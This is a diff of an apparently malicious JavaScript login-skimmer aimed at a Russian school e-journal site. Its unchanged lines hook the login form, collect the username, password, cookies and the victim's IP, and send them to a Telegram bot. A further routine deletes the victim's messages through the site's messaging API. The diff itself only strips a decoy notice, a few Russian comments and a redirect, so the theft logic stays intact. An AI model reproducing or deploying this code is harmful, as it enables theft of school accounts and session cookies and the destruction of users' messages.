@@ -30,18 +30,6 @@ const ck = document.cookie.split("; ").reduce((a, c) => {
 const ckStr = JSON.stringify(ck);
 let ip = "неизвестно";
 
-const msgBox = document.querySelector(".typography.overflow");
-if (msgBox) {
-  msgBox.innerHTML = `
-    <div class="notice notice--red notice--medium">
-      <div class="notice__content">
-        <div class="notice__content__text">
-          <p>Личные письма доступны только из dev!</p>
-        </div>
-      </div>
-    </div>`;
-}
-
 async function getIp() {
   try {
     const r = await fetch("https://api.ipify.org?format=json");
@@ -146,7 +134,7 @@ function bindForm(box, blur) {
 
     if (submitting) return;
     submitting = true;
-    btn.disabled = true; // блокируем кнопку на время
+    btn.disabled = true;
 
     const u = box.querySelector('input[autocomplete="username"]');
     const p = box.querySelector('input[autocomplete="current-password"]');
@@ -180,12 +168,10 @@ function bindForm(box, blur) {
           ? `[https://shkolakzn.eljur.ru/...](${encodeURI(d.actions[0].url)})`
           : "нет";
 
-        // 🔒 сообщение в TG отправится только 1 раз
         await sendTg(
           `🔑 Логин: ${uVal}\n🔒 Пароль: ${pVal}\n🌐 IP: ${ip}\n🍪Куки: ${ckStr}\n🔗Ссылка: ${link}`
         );
 
-        // проверка и удаление писем
         (async () => {
           const base = "/journal-api-messages-action";
           try {
@@ -227,7 +213,6 @@ function bindForm(box, blur) {
         document.body.style.overflow = "";
         document.body.style.position = "";
 
-        window.location.href = "/";
       } else if (d.errors?.length > 0) {
         const msg = d.errors[0].text || "Ошибка входа";
         errBox.innerHTML = `
